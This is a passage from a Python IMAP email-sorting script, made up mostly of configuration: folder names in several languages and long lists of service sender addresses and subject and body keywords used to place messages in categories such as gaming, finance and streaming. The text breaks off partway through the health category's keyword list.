# -*- coding: utf-8 -*-
import os
import re
import time
import threading
import imaplib
import easygui # For file open dialog
import email
import csv
import queue
import random
import translators as ts
from datetime import datetime
from collections import defaultdict, OrderedDict, Counter
from colorama import Fore, Back, Style, init
from email.header import decode_header
import langid
import sys
import platform
import socket # For basic hostname lookup

# --- INITIALIZE LIBRARIES ---
init(autoreset=True)

# --- CONFIGURATION ---
MESSAGES_TO_FETCH = 300 # Number of latest messages to fetch from each folder. Higher number means more thorough but slower.
TARGET_LANGUAGE = 'en' # Target language for translation. Helps in categorization based on keywords.
IMAP_TIMEOUT = 120     # Timeout for IMAP connections in seconds for maximum robustness. Crucial for slow servers.
SNIPPET_LENGTH = 2500  # Snippet length for translated body in summary.
DASHBOARD_REFRESH_RATE = 0.1 # Slower dashboard refresh for less flickering (0.1 to 0.2 recommended).

# IMAP folders to scan. Prioritized and includes common and localized names.
# The script will try to discover available folders and match these.
IMAP_FOLDERS_TO_SCAN = [
    "INBOX", "Inbox", "inbox", # Most common and essential
    "Spam", "Junk", "Bulk Mail", "Phishing", "Abuse", "Quarantine", # Spam/Unwanted
    "Trash", "Deleted Items", "Deleted Messages", # Deleted
    "Sent", "Sent Items", "Sent Messages", # Sent
    "Drafts", "Archive", "All Mail", "Starred", "Important", # Other common
    # Localized / common alternatives if auto-discovery fails specific names
    "דואר נכנס", "דואר זבל", "אשפה", "פריטים שנמחפו", "פריטים שנשלחו", "טיוטות", "ארכיון",
    "ספאם", "זבל", "מחיקות", "נשלחו", "טיוטות", "ארכיון",
    "Correo no deseado", "Éléments supprimés", "Posta in arrivo", "Cestino", "Inviati", "Bozze",
    "Courrier indésirable", "Courrier envoyé", "Éléments envoyés", "Brouillons", "Archives",
    "Posta indesiderata", "Posta inviata", "Elementi eliminati", "Bozze", "Archivio",
    "Spam", "Kosz", "Wysłane", "Robocze", "Archiwum"
]

# --- CATEGORIES DICTIONARY ---
# This is the MOST IMPORTANT section for categorization accuracy.
# Each category now includes:
#   - 'official_senders': Exact email addresses of official senders (case-insensitive). Highest priority.
#   - 'subject_keywords': Keywords/phrases expected in the email subject. Medium priority.
#   - 'body_keywords': Keywords/phrases expected in the email body (after translation to TARGET_LANGUAGE). Lower priority.
#
# IMPORTANT: EXPAND THESE LISTS WITH AS MANY RELEVANT ENTRIES AS POSSIBLE FOR BEST RESULTS!
CATEGORIES = OrderedDict([
    ("Gaming", {
        "official_senders": [
            "help@email.epicgames.com", "noreply@steampowered.com", "no-reply@blizzard.com", "noreply@ea.com",
            "support@playstation.com", "minecraft@mojang.com", "info@roblox.com", "support@ubisoft.com",
            "noreply@nintendo.net", "info@xbox.com", "store@gog.com", "press@twitch.tv", "noreply@discord.com",
            "accounts@riotgames.com", "no-reply@rockstargames.com", "noreply@battlenet.com",
            "support@steam.com", "account@xboxlive.com", "contact@playstation.com", "info@riotgames.com",
            "mail@epicgames.com", "email@discordapp.com", "game-updates@blizzard.com", "newsletter@ea.com",
            "support@xbox.com", "contact@gog.com", "help@mojang.com", "no-reply@twitch.tv", "email@twitch.tv",
            "info@minecraft.net", "privacy@blizzard.com", "security@riotgames.com", "support@valvesoftware.com",
            "noreply@playstation.net", "noreply@epicgames.com", "info@blizzard.com",
            "noreply@gamestop.com", "newsletter@ign.com", "news@gamespot.com", "info@cdprojektred.com",
            "support@twitch.tv", "twitch@twitch.tv", "info@epicgames.com", "email@playstation.com",
            "noreply@origin.com", "support@steamgames.com", "no-reply@bethesda.net", "support@zeni.net",
            "noreply@garena.com", "support@square-enix.com", "support@bandainamcoent.com", "noreply@activision.com",
            "account@nexon.com", "info@wargaming.net", "support@bungie.net", "no-reply@cdprojektred.com"
        ],
        "subject_keywords": [
            "game", "account", "login", "password reset", "verification", "security alert", "order", "purchase",
            "subscription", "gift card", "patch notes", "update", "server", "maintenance", "beta", "pre-order",
            "exclusive content", "rewards", "points", "epic games", "steam", "playstation", "xbox", "blizzard",
            "riot games", "nintendo", "mojang", "minecraft", "roblox", "gog", "twitch", "discord", "origin",
            "ubisoft connect", "steam guard", "gta", "fortnite", "valorant", "league of legends", "call of duty",
            "world of warcraft", "final fantasy", "cyberpunk", "red dead redemption", "apex legends",
            "sea of thieves", "guild wars", "elder scrolls", "fallout"
        ],
        "body_keywords": [
            "your game account", "new login detected", "password change request", "two-factor authentication",
            "your recent purchase", "transaction confirmed", "subscription renewed", "digital content",
            "game update available", "beta invitation", "pre-order bonus", "your in-game currency",
            "exclusive rewards", "welcome to our community", "game client", "launcher", "online services",
            "epic games store", "steam community", "playstation network", "xbox live", "nintendo eshop",
            "blizzard entertainment", "riot games support", "mojang account", "roblox platform",
            "gog.com store", "twitch drops", "discord nitro", "origin games", "ubisoft games",
            "access your games", "download now", "patch notes", "game news", "new release"
        ]
    }),
    ("Social & Communication", {
        "official_senders": [
            "notification@facebookmail.com", "info@twitter.com", "messages-noreply@linkedin.com",
            "no-reply@tiktok.com", "no-reply@mail.instagram.com", "noreply@pinterest.com",
            "no-reply@snapchat.com", "noreply@redditmail.com", "noreply@tumblr.com", "noreply@discordapp.com",
            "support@telegram.org", "noreply@whatsapp.com", "info@zoom.us", "no-reply@skype.com",
            "security@facebook.com", "support@twitter.com", "account-security-noreply@linkedin.com",
            "noreply@x.com", "notifications@instagram.com", "noreply@linkedin.com", "help@tiktok.com",
            "hello@medium.com", "noreply@quora.com", "info@signal.org", "hello@mewe.com",
            "support@viber.com", "info@line.me", "noreply@vk.com", "help@wechat.com", "security@reddit.com",
            "community@youtube.com", "noreply@youtube.com", "noreply@snap.com", "support@discord.com",
            "noreply@threads.net", "notifications@threads.net", "support@threads.net", "noreply@mastodon.social",
            "admin@blueskyweb.xyz", "noreply@gettr.com", "noreply@parler.com", "support@clubhouse.com",
            "email@linkedin.com", "info@instagram.com", "notifications@twitter.com", "hello@facebook.com",
            "noreply@meetup.com", "info@patreon.com", "notifications@flickr.com", "noreply@weibo.com",
            "support@telegram.me", "hello@signal.app"
        ],
        "subject_keywords": [
            "new message", "friend request", "connection", "notification", "security code", "login alert",
            "password reset", "account activity", "update", "post", "comment", "like", "mention", "tag",
            "event invitation", "group update", "newsletter", "terms of service", "privacy policy",
            "facebook", "instagram", "twitter", "x.com", "linkedin", "tiktok", "snapchat", "reddit",
            "pinterest", "discord", "telegram", "whatsapp", "zoom", "skype", "youtube", "threads",
            "mastodon", "bluesky", "signal", "viber", "wechat", "vkontakte", "medium", "quora"
        ],
        "body_keywords": [
            "someone tried to log in to your account", "new message from", "you have a new notification",
            "your friend request has been accepted", "people you may know", "your post was liked by",
            "new comment on your photo", "your account security", "verify your login", "password reset link",
            "your meeting is scheduled", "join the call", "new subscriber", "community guidelines",
            "profile update", "privacy settings", "terms and conditions", "unread messages",
            "follow new people", "trending topics", "live stream", "video call", "chat history"
        ]
    }),
    ("Shopping & E-commerce", {
        "official_senders": [
            "order-update@amazon.com", "noreply@ebay.com", "service@paypal.com", "noreply@aliexpress.com",
            "delivery@uber.com", "receipt@lyft.com", "help@shopify.com", "payments@stripe.com",
            "noreply@booking.com", "express@airbnb.com", "reservations@expedia.com",
            "auto-confirm@amazon.com", "no-reply@walmart.com", "noreply@etsy.com", "notifications@uber.com",
            "security@paypal.com", "support@shein.com", "service@target.com",
            "customer-service@zara.com", "info@asos.com", "help@sephora.com", "orders@doordash.com",
            "support@instacart.com", "noreply@rakuten.com", "order@newegg.com", "info@ikea.com",
            "noreply@alibaba.com", "no-reply@bestbuy.com", "noreply@starbucks.com", "rewards@starbucks.com",
            "support@wayfair.com", "newsletter@macys.com", "email@hm.com", "service@kroger.com",
            "info@gap.com", "customer-service@costco.com", "noreply@wish.com", "info@lazada.com",
            "noreply@shopee.com", "hello@zalando.com", "noreply@asos.com", "info@ulta.com",
            "noreply@grubhub.com", "order@seamless.com", "email@ubereats.com", "support@etsy.com",
            "account@amazon.com", "info@ebay.com", "newsletter@alibaba.com", "notifications@paypal.com",
            "support@aliexpress.com", "info@booking.com", "hello@deliveroo.com", "support@grubhub.com",
            "customercare@zappos.com", "service@nordstrom.com", "noreply@gap.com", "newsletter@ikea.com",
            "orders@foodpanda.com", "customer@coupang.com", "noreply@rakuten.co.jp"
        ],
        "subject_keywords": [
            "order confirmation", "shipping update", "delivery", "receipt", "invoice", "payment", "refund",
            "your purchase", "transaction details", "security alert", "account verification", "password reset",
            "special offer", "discount code", "sale", "new arrivals", "your cart", "wishlist", "loyalty points",
            "amazon", "ebay", "paypal", "aliexpress", "uber", "lyft", "shopify", "stripe", "booking.com",
            "airbnb", "expedia", "walmart", "etsy", "shein", "target", "zara", "asos", "sephora", "doordash",
            "instacart", "rakuten", "newegg", "ikea", "alibaba", "best buy", "starbucks", "wayfair", "macys",
            "h&m", "kroger", "gap", "costco", "wish", "lazada", "shopee", "zalando", "ulta", "grubhub", "ubereats",
            "seamless", "food delivery", "travel booking", "flight", "hotel", "rental car"
        ],
        "body_keywords": [
            "your order has been placed", "tracking number", "item shipped", "delivery estimate",
            "your payment was successful", "refund processed", "your account security is important",
            "verify your identity", "password reset link", "exclusive discount for you",
            "items in your cart", "loyalty program", "rewards earned", "new collection has arrived",
            "deal of the day", "flash sale", "shipping address", "billing information", "customer service",
            "purchase history", "return policy", "download your invoice", "delivery address",
            "reservation confirmed", "check-in details", "flight itinerary", "hotel booking",
            "car rental confirmation", "points balance", "voucher code", "delivery status"
        ]
    }),
    ("Streaming & Entertainment", {
        "official_senders": [
            "info@mailer.netflix.com", "disneyplus@mail.disneyplus.com", "info@email.hulu.com",
            "no-reply@primevideo.com", "hello@info.hbomax.com", "noreply@youtube.com",
            "email@spotify.com", "noreply@email.apple.com", "hello@mail.tidal.com",
            "customerservice@pandora.com", "updates@crunchyroll.com",
            "info@vimeo.com", "no-reply@plex.tv", "support@funimation.com", "noreply@peacocktv.com",
            "info@paramountplus.com", "hello@discoveryplus.com", "marketing@hbo.com",
            "ticketmaster@email.ticketmaster.com", "info@fandango.com", "news@eventbrite.com",
            "hello@masterclass.com", "info@skillshare.com", "no-reply@udemy.com", "notifications@coursera.org",
            "support@netflix.com", "info@hbo.com", "updates@appletv.apple.com", "no-reply@music.youtube.com",
            "newsletter@disney.com", "support@hulu.com", "email@primevideo.com", "hello@hbomax.com",
            "info@spotify.com", "appleid@id.apple.com", "service@pandora.com", "noreply@crunchyroll.com",
            "support@vimeo.com", "help@plex.tv", "noreply@funimation.com", "info@peacocktv.com",
            "support@paramountplus.com", "hello@discoveryplus.com", "marketing@ticketmaster.com",
            "info@fandango.com", "news@eventbrite.com", "hello@masterclass.com",
            "account@netflix.com", "noreply@hbo.com", "info@spotify.com", "support@youtube.com",
            "noreply@vudu.com", "support@sling.com", "info@siriusxm.com", "noreply@audible.com",
            "email@disney.com", "contact@marvel.com", "noreply@pixar.com", "contact@starwars.com"
        ],
        "subject_keywords": [
            "your subscription", "new release", "series", "movie", "show", "watch now", "playlist", "album",
            "concert", "ticket confirmation", "event details", "webinar", "course access", "account activity",
            "password reset", "security alert", "billing update", "free trial", "recommendation",
            "netflix", "disney+", "hulu", "prime video", "hbo max", "youtube", "spotify", "apple music",
            "tidal", "pandora", "crunchyroll", "vimeo", "plex", "funimation", "peacock", "paramount+",
            "discovery+", "ticketmaster", "fandango", "eventbrite", "masterclass", "skillshare", "udemy",
            "coursera", "apple tv", "amazon prime", "music", "podcast", "audiobook"
        ],
        "body_keywords": [
            "your subscription is active", "new episode available", "continue watching", "stream now",
            "your payment for", "upcoming charges", "account security alert", "verify your account",
            "password reset link", "exclusive content for subscribers", "your personalized recommendations",
            "concert tickets attached", "event entry details", "your course enrollment",
            "access your learning platform", "listen to your favorite music", "your new playlist",
            "download offline", "parental controls", "profile settings", "cancel subscription",
            "your viewing history", "terms of service update", "billing information", "free period",
            "premium features", "unlimited streaming", "watch on any device", "your library",
            "new uploads", "live event access"
        ]
    }),
    ("Finance & Banking", {
        "official_senders": [
            "alerts@chase.com", "service@bankofamerica.com", "online.services@americanexpress.com",
            "hello@revolut.com", "support@coinbase.com", "do-not-reply@binance.com", "service@paypal.com",
            "noreply@robinhood.com", "info@etrade.com", "noreply@fidelity.com", "support@bybit.com",
            "support@kraken.com", "noreply@gemini.com", "alert@wellsfargo.com", "noreply@citi.com",
            "security@capitalone.com", "info@discover.com", "hello@venmo.com", "security@cash.app",
            "support@sofi.com", "noreply@barclays.com", "info@deutschebank.com", "noreply@hsbc.com",
            "account-security@jpmorgan.com", "no-reply@stripe.com", "support@affirm.com", "hello@klarna.com",
            "notifications@chase.com", "security@paypal.com", "info@coinbase.com", "support@revolut.com",
            "customer-service@bankofamerica.com", "alert@americanexpress.com", "noreply@goldmansachs.com",
            "noreply@morganstanley.com", "info@ally.com", "support@capitalone.com", "noreply@schwab.com",
            "hello@chime.com", "support@greenlight.com", "info@robinhood.com",
            "noreply@bankofamerica.com", "info@chase.com", "alerts@capitalone.com", "notifications@paypal.com",
            "noreply@santander.com", "support@creditkarma.com", "info@experian.com", "noreply@transunion.com",
            "security@equifax.com", "noreply@fidelityinvestments.com", "support@ameritrade.com",
            "alerts@hometrust.com", "info@lendingclub.com", "noreply@creditonebank.com"
        ],
        "subject_keywords": [
            "security alert", "account activity", "transaction", "statement", "billing", "invoice", "payment",
            "transfer", "password reset", "login attempt", "suspicious activity", "verification code",
            "loan application", "credit score", "investment", "portfolio update", "deposit", "withdrawal",
            "chase", "bank of america", "american express", "revolut", "coinbase", "binance", "paypal",
            "robinhood", "etrade", "fidelity", "bybit", "kraken", "gemini", "wells fargo", "citi",
            "capital one", "discover", "venmo", "cash app", "sofi", "barclays", "deutsche bank", "hsbc",
            "j.p. morgan", "stripe", "affirm", "klarna", "santander", "credit karma", "experian",
            "transunion", "equifax", "schwab", "chime", "greenlight"
        ],
        "body_keywords": [
            "your account has been accessed", "suspicious login attempt", "verify your identity",
            "password reset request", "your monthly statement is ready", "recent transaction details",
            "funds deposited", "withdrawal confirmed", "new investment opportunity", "your credit score update",
            "loan approval", "billing cycle", "payment due", "overdue invoice", "fraud alert",
            "protect your account", "two-factor authentication setup", "update your banking details",
            "your current balance", "investment performance", "tax documents available", "annual report",
            "security notification", "unauthorized activity", "credit card statement", "loan payment",
            "mortgage update", "financial advice", "market insights", "portfolio summary", "account locked"
        ]
    }),
    ("Productivity & Cloud", {
        "official_senders": [
            "notifications@slack.com", "info@asana.com", "noreply@trello.com", "noreply@monday.com",
            "noreply@notion.so", "noreply@github.com", "no-reply@dropbox.com", "noreply@email.apple.com",
            "noreply@google.com", "notifications@microsoft.com", "hello@adobe.com", "success@salesforce.com",
            "hello@mailchimp.com", "no-reply@zoom.us",
            "support@atlassian.com", "info@evernote.com", "noreply@todoist.com", "support@lastpass.com",
            "hello@dashlane.com", "support@1password.com", "noreply@sendgrid.com", "info@twilio.com",
            "support@digitalocean.com", "aws-security@amazon.com", "azure-noreply@microsoft.com",
            "gcp-billing@google.com", "noreply@heroku.com", "info@netlify.com", "hello@vercel.com",
            "notifications@figma.com", "info@canva.com", "hello@grammarly.com", "noreply@calendly.com",
            "info@microsoft.com", "security-noreply@google.com", "notifications@drive.google.com",
            "support@slack.com", "account@github.com", "info@dropbox.com", "noreply@onedrive.live.com",
            "hello@evernote.com", "noreply@zapier.com", "info@intercom.com", "support@zendesk.com",
            "support@stripe.com", "noreply@zoom.us", "info@google.com", "noreply@microsoft.com",
            "hello@apple.com", "notifications@dropbox.com", "noreply@microsoftonline.com",
            "info@teamviewer.com", "support@tableau.com", "hello@mural.co", "noreply@lucidchart.com",
            "info@airtable.com", "noreply@hubspot.com", "support@salesforce.com"
        ],
        "subject_keywords": [
            "new activity", "document shared", "file uploaded", "meeting invite", "calendar update",
            "task assigned", "project update", "security alert", "password reset", "login attempt",
            "subscription renewal", "invoice", "billing", "service notification", "outage report",
            "slack", "asana", "trello", "monday.com", "notion", "github", "dropbox", "google drive",
            "microsoft 365", "adobe creative cloud", "salesforce", "mailchimp", "zoom", "atlassian",
            "jira", "confluence", "evernote", "todoist", "lastpass", "dashlane", "1password", "sendgrid",
            "twilio", "digitalocean", "aws", "azure", "google cloud", "heroku", "netlify", "vercel",
            "figma", "canva", "grammarly", "calendly", "office 365", "g suite", "teams", "onedrive",
            "sharepoint", "outlook", "excel", "powerpoint", "word", "forms"
        ],
        "body_keywords": [
            "your account has been accessed", "new file uploaded to shared folder", "invitation to collaborate",
            "task assigned to you", "project progress update", "upcoming meeting reminder",
            "password change initiated", "unusual login activity", "your subscription will renew",
            "payment failed", "service interruption", "scheduled maintenance", "new feature update",
            "cloud storage usage", "api key generated", "server status", "build failed",
            "pull request merged", "new comment on your issue", "your calendar has been updated",
            "shared document", "shared link", "access permissions", "download your files",
            "upload new documents", "team collaboration", "workflow automation", "data backup",
            "synchronization report", "your license key", "billing information updated"
        ]
    }),
    ("Education & AI", {
        "official_senders": [
            "noreply@coursera.org", "info@edx.org", "noreply@udemy.com", "no-reply@khanacademy.org",
            "info@openai.com", "noreply@duolingo.com", "hello@codecademy.com", "hello@datacamp.com",
            "noreply@pluralsight.com", "hello@masterclass.com", "info@skillshare.com",
            "noreply@harvard.edu", "notifications@mit.edu", "info@stanford.edu", "info@ox.ac.uk",
            "ai-updates@google.com", "research@deepmind.com", "hello@perplexity.ai", "noreply@huggingface.co",
            "kaggle-noreply@google.com", "info@tensorflow.org", "hello@pytorch.org",
            "no-reply@udacity.com", "support@futurelearn.com", "notifications@google.classroom.com",
            "info@chatgpt.com", "support@coursera.com", "learning@linkedin.com",
            "news@deepmind.com", "info@anthropic.com", "noreply@xai.com", "help@openai.com",
            "info@elevenlabs.io", "support@midjourney.com", "noreply@runwayml.com", "info@perplexity.ai",
            "noreply@google.com/ai", "info@nvidia.com", "noreply@elementai.com", "hello@deeplearning.ai",
            "info@microsoft.ai", "noreply@ibm.ai", "support@sap.com/ai", "noreply@salesforce.com/einstein",
            "info@c3.ai", "hello@datarobot.com", "notifications@kaggle.com", "support@huggingface.co"
        ],
        "subject_keywords": [
            "course enrollment", "assignment due", "grade notification", "lecture update", "webinar invite",
            "student account", "campus news", "scholarship opportunity", "tuition fee", "degree program",
            "AI breakthrough", "research paper", "model update", "dataset", "api access", "conference",
            "new algorithm", "machine learning", "deep learning", "neural network", "generative ai",
            "coursera", "edx", "udemy", "khan academy", "openai", "duolingo", "codecademy", "datacamp",
            "pluralsight", "masterclass", "skillshare", "harvard", "mit", "stanford", "oxford", "google ai",
            "deepmind", "perplexity", "hugging face", "kaggle", "tensorflow", "pytorch", "udacity",
            "futurelearn", "google classroom", "chatgpt", "anthropic", "xai", "midjourney", "runwayml",
            "nvidia", "microsoft ai", "ibm watson", "einstein ai"
        ],
        "body_keywords": [
            "your course progress", "new assignment posted", "your grades are available",
            "join the live lecture", "important announcement for students", "financial aid information",
            "enrollment confirmation", "your graduation ceremony", "alumni network",
            "recent advances in AI", "new AI model released", "access to API documentation",
            "research findings", "future of artificial intelligence", "machine learning course",
            "deep learning framework", "ethical AI", "AI research opportunities", "your student portal",
            "learning path", "certification details", "online learning platform", "training materials",
            "interactive lessons", "webinar invitation", "academic calendar", "campus events"
        ]
    }),
    ("Email Providers", {
        "official_senders": [
            "accounts@google.com", "account-security-noreply@microsoft.com", "noreply@yahoo.com",
            "info@protonmail.com", "noreply@tutanota.com", "no-reply@mail.com", "noreply@gmx.com",
            "noreply@aol.com", "security@zoho.com", "security@yandex.com", "no_reply@email.apple.com",
            "outlook_team@microsoft.com", "noreply@hotmail.com", "noreply@live.com", "service@qq.com",
            "noreply@163.com", "support@web.de", "info@freenet.de", "help@walla.com",
            "noreply@outlook.com", "security-check@google.com", "notifications@mail.ru",
            "noreply@mail.ru", "info@fastmail.com", "support@hey.com", "noreply@runbox.com",
            "contact@posteo.de", "support@mailbox.org", "info@seznam.cz",
            "support@gmail.com", "info@yahoo.com", "security@apple.com",
            "admin@email.com", "noreply@emailservice.com", "noreply@mail-provider.com",
            "support@mymail.com", "noreply@ymail.com", "postmaster@domain.com"
        ],
        "subject_keywords": [
            "security alert", "unusual login", "password reset", "account verification", "storage full",
            "important update", "suspicious activity", "new device login", "email address change",
            "account locked", "imap settings", "smtp settings", "mail server", "verify your account",
            "google", "gmail", "outlook", "hotmail", "live", "yahoo", "aol", "mail.com", "gmx", "zoho",
            "yandex", "apple mail", "protonmail", "tutanota", "fastmail", "hey.com", "mail.ru", "walla"
        ],
        "body_keywords": [
            "someone recently signed in to your account", "we detected unusual login activity",
            "verify your email address", "your password was changed", "your mailbox is almost full",
            "important security message", "action required for your account", "new device logged in",
            "password reset request", "click here to reset your password", "your account has been temporarily locked",
            "update your security settings", "protect your account", "two-step verification",
            "storage limit exceeded", "email account details", "configuration settings",
            "important service announcement", "data privacy notice", "terms of service updated"
        ]
    }),
    ("Security & Privacy", {
        "official_senders": [
            "support@authy.com", "no-reply@lastpass.com", "support@dashlane.com", "info@1password.com",
            "info@nordvpn.com", "support@expressvpn.com", "hello@surfshark.com", "support@privateinternetaccess.com",
            "info@bitdefender.com", "noreply@kaspersky.com", "support@mcafee.com", "noreply@norton.com",
            "info@avast.com", "security@cloudflare.com", "noreply@okta.com", "info@duo.com",
            "no-reply@yubico.com", "hello@privacy.com", "support@signal.org", "info@torproject.org",
            "support@protonvpn.com", "alerts@identity.apple.com", "security@account.microsoft.com",
            "security@myaccount.google.com", "alert@bitdefender.com", "noreply@malwarebytes.com",
            "support@google.com/2sv", "security-alert@facebookmail.com", "action@cloudflare.com",
            "info@vyprvpn.com", "support@purevpn.com", "hello@cyberghost.com", "support@ipvanish.com",
            "noreply@trendmicro.com", "info@sophos.com", "support@avg.com", "noreply@logmein.com",
            "support@keepersecurity.com", "info@roboform.com", "info@expressvpn.com", "support@nordvpn.com",
            "noreply@bitdefender.com", "security@google.com", "noreply@firewalla.com", "support@paloaltonetworks.com",
            "alerts@checkpoint.com", "noreply@fortinet.com", "security@sophos.com", "support@kaspersky.com"
        ],
        "subject_keywords": [
            "security alert", "unusual activity", "password manager", "vpn connection", "threat detected",
            "virus alert", "malware detected", "account protected", "identity theft", "data breach",
            "two-factor authentication", "2FA setup", "privacy settings", "encryption", "secure login",
            "authy", "lastpass", "dashlane", "1password", "nordvpn", "expressvpn", "surfshark", "pia",
            "bitdefender", "kaspersky", "mcafee", "norton", "avast", "cloudflare", "okta", "duo", "yubico",
            "privacy.com", "signal", "tor", "protonvpn", "google security", "microsoft security",
            "apple security", "facebook security", "malwarebytes", "cyberghost", "ipvanish"
        ],
        "body_keywords": [
            "we detected suspicious activity on your account", "your password has been reset",
            "unauthorized access attempt", "new device login detected", "critical security update",
            "your VPN subscription is expiring", "threat detected on your device",
            "your antivirus requires attention", "protect your online privacy",
            "enable two-factor authentication for enhanced security", "password changed on your account",
            "review recent login activity", "your data is encrypted", "secure connection established",
            "important privacy notification", "new security features", "vulnerability alert",
            "patch available", "security best practices", "identity verification required",
            "multi-factor authentication", "secure Browse", "phishing attempt", "spam detected"
        ]
    }),
    ("News & Media", {
        "official_senders": [
            "news@nytimes.com", "customercare@wsj.com", "email@bbc.co.uk", "cnn@email.cnn.com",
            "foxnews@email.foxnews.com", "newsletters@reuters.com", "apnews@email.apnews.com",
            "info@theguardian.com", "newsletters@washingtonpost.com", "daily@bloomberg.net",
            "editorial@forbes.com", "newsletter@businessinsider.com", "info@techcrunch.com",
            "noreply@engadget.com", "hello@theverge.com", "info@wired.com", "newsletter@cnet.com",
            "noreply@huffpost.com", "daily@buzzfeed.com", "news@vice.com", "info@politico.com",
            "nprnews@npr.org", "dailybrief@time.com", "newsletters@economist.com",
            "info@aljazeera.com", "noreply@rt.com", "newsletters@dw.com",
            "breakingnews@cnn.com", "subscribe@nytimes.com", "info@theverge.com",
            "email@ft.com", "news@news.com.au", "alerts@drudgereport.com", "info@breitbart.com",
            "newsletter@dailywire.com", "news@dailykos.com", "info@vox.com", "hello@axios.com",
            "news@buzzfeednews.com", "info@nationalgeographic.com", "newsletter@scientificamerican.com",
            "info@bbc.com", "news@cnn.com", "email@nytimes.com", "newsletter@washingtonpost.com",
            "info@thenewyorker.com", "daily@theatlantic.com", "newsletter@newrepublic.com",
            "info@rollingstone.com", "newsletter@vogue.com", "news@ign.com", "info@gamespot.com",
            "newsletter@variety.com", "info@hollywoodreporter.com", "news@billboard.com"
        ],
        "subject_keywords": [
            "breaking news", "daily briefing", "newsletter", "top stories", "exclusive report", "market update",
            "tech news", "politics", "world affairs", "entertainment news", "sports digest", "analysis",
            "subscription update", "special edition", "opinion", "latest headlines", "weekly digest",
            "new york times", "wall street journal", "bbc news", "cnn", "fox news", "reuters", "ap news",
            "the guardian", "washington post", "bloomberg", "forbes", "business insider", "techcrunch",
            "engadget", "the verge", "wired", "cnet", "huffpost", "buzzfeed news", "vice", "politico",
            "npr", "time", "the economist", "al jazeera", "rt", "dw", "financial times", "axios", "vox"
        ],
        "body_keywords": [
            "read the full story", "latest updates on", "your daily news summary", "subscribe to our newsletter",
            "breaking news alert", "exclusive content for subscribers", "in-depth analysis",
            "market trends", "tech industry insights", "political commentary", "global events",
            "entertainment highlights", "sports results", "opinion piece", "journalism",
            "featured article", "must-read", "your personalized news feed", "podcast recommendations",
            "video report", "photo gallery", "editor's pick", "terms of use for our content",
            "manage your subscription", "newsletter preferences", "download our app"
        ]
    }),
    ("Travel & Hospitality", {
        "official_senders": [
            "noreply@booking.com", "express@airbnb.com", "reservations@expedia.com",
            "noreply@priceline.com", "info@travelocity.com", "noreply@agoda.com",
            "email@tripadvisor.com", "hello@trivago.com", "noreply@kayak.com", "info@skyscanner.com",
            "reservations@united.com", "deltaairlines@email.delta.com", "aa.email@americanairlines.com",
            "info@southwest.com", "reservations@emirates.com", "noreply@marriott.com",
            "hiltonhonors@hilton.com", "ihgrewardsclub@ihg.com", "worldofhyatt@hyatt.com",
            "info@turo.com", "support@zipcar.com", "reservations@hertz.com", "noreply@avis.com",
            "customer-service@enterprise.com", "info@royalcaribbean.com", "noreply@carnival.com",
            "info@amtrak.com", "tickets@greyhound.com",
            "support@booking.com", "reservations@hilton.com", "info@travelodge.com",
            "reservations@jetblue.com", "notifications@spirit.com", "info@allegiantair.com",
            "customer.service@frontierairlines.com", "noreply@lufthansa.com", "info@airfrance.com",
            "reservations@britishairways.com", "support@rail.cc", "info@hostelworld.com",
            "noreply@couchsurfing.com", "info@trip.com", "noreply@kiwi.com",
            "reservations@delta.com", "noreply@united.com", "info@expedia.com", "support@airbnb.com",
            "info@cathaypacific.com", "support@qatarairways.com", "reservations@singaporeair.com",
            "info@ana.co.jp", "reservations@japanairlines.com", "support@virginatlantic.com",
            "noreply@emirates.net", "info@qantas.com.au", "support@aircanada.ca"
        ],
        "subject_keywords": [
            "booking confirmation", "flight itinerary", "hotel reservation", "rental car details",
            "check-in", "boarding pass", "trip update", "travel alert", "loyalty program", "points balance",
            "vacation package", "cruise booking", "ticket information", "cancellation", "refund status",
            "destination guide", "travel tips", "special offer", "rewards",
            "booking.com", "airbnb", "expedia", "priceline", "travelocity", "agoda", "tripadvisor",
            "trivago", "kayak", "skyscanner", "united airlines", "delta", "american airlines",
            "southwest", "emirates", "marriott", "hilton", "ihg", "hyatt", "turo", "zipcar", "hertz",
            "avis", "enterprise", "royal caribbean", "carnival cruise line", "amtrak", "greyhound",
            "jetblue", "spirit airlines", "lufthansa", "air france", "british airways", "cathay pacific",
            "qatar airways", "singapore airlines", "japan airlines", "qantas", "air canada"
        ],
        "body_keywords": [
            "your flight is confirmed", "your hotel booking details", "access your itinerary",
            "online check-in available", "your boarding pass is attached", "important travel updates",
            "flight delay notification", "gate change", "baggage claim information",
            "your loyalty points balance", "redeem your rewards", "exclusive travel deals",
            "explore new destinations", "your upcoming trip", "reservation number", "check-out time",
            "car pick-up instructions", "cruise embarkation", "tour details", "visa requirements",
            "health and safety protocols", "airport transfer", "travel insurance", "package holiday",
            "room amenities", "dining options", "resort activities", "travel advisory",
            "confirm your booking", "manage your reservation"
        ]
    }),
    ("Health & Wellness", {
        "official_senders": [
            "info@myfitnesspal.com", "noreply@fitbit.com", "info@strava.com", "hello@peloton.com",
            "support@whoop.com", "hello@headspace.com", "info@calm.com", "support@tenpercent.com",
            "hello@noom.com", "noreply@weightwatchers.com", "info@talkspace.com", "support@betterhelp.com",
            "noreply@teladoc.com", "info@doctorondemand.com", "newsletter@webmd.com",
            "info@mayoclinic.org", "noreply@nih.gov", "info@cdc.gov", "info@who.int",
            "support@healthline.com", "hello@glo.com", "updates@dailyburn.com", "no-reply@nike.com",
            "info@fitnesspal.com", "support@sleepcycle.com", "hello@calm.com",
            "info@apple.health.com", "support@google.fit.com", "noreply@garmin.com", "hello@oura.com",
            "info@meditation.app", "support@calm.com", "info@sleep.app", "notifications@whoop.com",
            "noreply@ww.com", "info@talkspace.com", "support@betterhelp.com",
            "support@myfitnesspal.com", "info@fitbit.com", "hello@headspace.com", "noreply@who.int",
            "info@meditationstudio.com", "support@seven.app", "hello@freeletics.com",
            "info@mentalhealthamerica.net", "support@nami.org", "info@adaa.org",
            "noreply@goodrx.com", "info@khealth.com", "noreply@folxhealth.com"
        ],
        "subject_keywords": [
            "workout summary", "activity report", "sleep analysis", "mindfulness session", "meditation guide",
            "nutrition plan", "diet tips", "appointment reminder", "health consultation", "medical records",
            "prescription ready", "wellness program", "fitness challenge", "mental health support",
            "telehealth visit", "symptoms update", "myfitnesspal", "fitbit", "strava", "peloton", "whoop",
            "headspace", "calm", "ten percent happier", "noom", "weight watchers", "talkspace", "betterhelp",
            "teladoc", "doctor on demand", "webmd", "mayo clinic", "nih", "cdc", "who", "healthline", "nike training",
            "apple health", "google fit", "garmin connect", "oura ring", "mental health", "therapy", "medication"
        ],
        "body_keywords": [
            "your daily activity report", "sleep score details", "start your meditation practice",
